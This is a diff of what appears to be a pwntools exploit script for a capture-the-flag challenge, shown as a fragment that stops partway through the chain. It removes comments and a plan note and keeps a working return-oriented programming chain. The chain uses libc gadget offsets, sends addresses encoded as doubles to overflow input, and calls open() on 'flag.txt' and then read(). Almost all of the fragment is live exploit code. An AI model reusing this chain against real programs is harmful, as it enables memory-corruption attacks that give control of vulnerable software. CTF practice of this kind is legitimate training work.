@@ -47,32 +47,15 @@ def hex_to_double_as_bytes(hex_number):
     double_str = f"{double_value:.16e}".encode('utf-8')
     return double_str
 
-# Gadgets
-#0x000000000002a3e5: pop rdi; ret;
-#0x000000000002be51: pop rsi; ret;
-#0x000000000011f2e7: pop rdx; pop r12; ret;
-#0x0000000000091316: syscall; ret;
-#0x0000000000029139: ret;
-#0x00000000000a00ae: sub rsp, -0x80; mov eax, r12d; pop rbp; pop r12; pop r13; ret;
-#0x00000000000d8380 : mov rax, 2 ; ret
-#0x0000000000045eb0 : pop rax ; ret
-#0x00000000000baaf9 : xor rax, rax ; ret
-
 movrax2 = libc.address + 0x00000000000d8380
 poprdi = libc.address + 0x2a3e5
 poprsi = libc.address + 0x2be51
 syscall = libc.address + 0x0000000000091316
 poprdx = libc.address + 0x000000000011f2e7
 xorax = libc.address + 0x00000000000baaf9
-'''
-exploit plan
-open(), read(), puts()
-'''
-
 #flag.txt
 r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0x7478742e67616c66)))
 r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0x0))) #wasted quadword stack is filled we need to put a \0
-
 #ropping
 #open(flag.txt)
 r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(poprdi)))
@@ -81,7 +64,6 @@ r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(poprsi)))
 r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0)))
 r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(movrax2)))
 r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(syscall)))
-
 #read()
 r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(poprdi)))
 r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0x3)))
